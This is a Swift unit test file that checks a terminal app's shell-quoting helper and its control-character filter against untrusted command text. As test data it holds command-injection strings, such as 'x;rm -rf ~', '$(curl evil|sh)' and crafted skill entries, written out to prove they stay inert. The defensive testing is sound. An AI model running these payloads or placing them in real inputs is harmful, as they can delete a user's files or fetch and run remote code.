//
//  ShellWordTests.swift
//  XylemTests
//
//  Text from outside (skills.sh entries, branch names) typed into a tab as
//  part of a command stays one shell word.
//

import Foundation
import Testing

struct ShellWordTests {
    @Test func plainWordsStayAsTheyAre() {
        for word in ["anthropics/skills", "frontend-design", "feature/new-sidebar", "v1.2.3", "a1b2c3d", "user@host:repo"] {
            #expect(TerminalSession.shellWord(word) == word)
        }
    }

    @Test func anythingElseIsQuoted() {
        #expect(TerminalSession.shellWord("x;rm -rf ~") == "'x;rm -rf ~'")
        #expect(TerminalSession.shellWord("$(curl evil|sh)") == "'$(curl evil|sh)'")
        #expect(TerminalSession.shellWord("`id`") == "'`id`'")
        #expect(TerminalSession.shellWord("it's") == "'it'\\''s'")
        #expect(TerminalSession.shellWord("") == "''")
        #expect(TerminalSession.shellWord("проєкт") == "'проєкт'")
    }

    @Test func aQuotedWordIsOneArgumentToARealShell() throws {
        let hostile = "x; touch pwned $(id) `id` 'q' \"d\""
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["-c", "printf '%s' " + TerminalSession.shellWord(hostile)]
        let pipe = Pipe()
        process.standardOutput = pipe
        try process.run()
        process.waitUntilExit()
        let output = String(decoding: pipe.fileHandleForReading.readDataToEndOfFile(), as: UTF8.self)
        #expect(output == hostile)
    }

    @Test func skillInstallCommandQuotesCraftedEntries() {
        let normal = MarketplaceSkill(source: "anthropics/skills", skillId: "frontend-design", name: "x", installs: 1)
        #expect(normal.installCommand == "npx skills add anthropics/skills -s frontend-design")
        let crafted = MarketplaceSkill(source: "a/b;curl evil|sh", skillId: "x$(id)", name: "x", installs: 1)
        #expect(crafted.installCommand == "npx skills add 'a/b;curl evil|sh' -s 'x$(id)'")
    }

    @Test func commandsWithControlCharactersAreRefused() {
        #expect(XylemTerminalView.containsControlCharacter("x\rrm -rf ~"))
        #expect(XylemTerminalView.containsControlCharacter("a\u{1B}[2J"))
        #expect(!XylemTerminalView.containsControlCharacter("npx skills add a/b -s c"))
        // Emoji joiners are format characters, not keys.
        #expect(!XylemTerminalView.containsControlCharacter("/model opus 👩\u{200D}💻"))
    }
}
